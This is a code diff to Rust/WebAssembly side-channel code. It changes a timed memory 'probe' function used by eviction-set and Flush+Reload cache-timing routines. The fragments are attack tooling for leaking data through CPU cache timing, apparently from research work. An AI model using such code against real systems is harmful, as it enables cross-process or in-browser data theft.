@@ -1,4 +1,4 @@
-use core::mem::ManuallyDrop;
+use core::{hint::black_box, mem::ManuallyDrop};
 
 use alloc::{boxed::Box, collections::LinkedList, vec::Vec};
 use js::{encrypt, random, log};
@@ -41,12 +41,12 @@ pub extern "C" fn get_time() -> u64 {
     }
 }
 
-#[inline(always)]
-fn probe(target: &[u8], offset: u32) -> u64 {
+#[no_mangle]
+pub fn probe(target: &[u8], offset: usize) -> u64 {
     let start = get_time();
     {
-        let _ = target[offset as usize];
-    }
+        let a = target[offset];
+    };
     get_time() - start
 }
 
@@ -69,7 +69,7 @@ fn wait(number_of_cycles: u32) {
 
 fn get_slow_time(eviction_set: &LinkedList<u32>, target: &[u8], offset: u32) -> u64 {
     evict(target, eviction_set);
-    probe(target, offset)
+    probe(target, offset as usize)
 }
 
 fn generate_conflict_set(eviction_sets: &Vec<LinkedList<u32>>) -> LinkedList<u32> {
@@ -154,7 +154,7 @@ pub extern "C" fn flush_reload(threshold: u32, time_slots: u32, wait_cycles: u32
             let start = get_time();
             let time_slot_results : Vec<u32> = probes
                 .iter()
-                .map(|p| probe(target.as_ref(), *p) as u32)
+                .map(|p| probe(target.as_ref(), *p as usize) as u32)
                 .collect();
 
             evict(target.as_ref(), &conflict_set);
@@ -172,6 +172,5 @@ pub extern "C" fn flush_reload(threshold: u32, time_slots: u32, wait_cycles: u32
     log(boxed[0] as u64);
     log(boxed[1] as u64);
     log(boxed[2] as u64);
-    log(boxed.len() as u64);
     boxed
 }
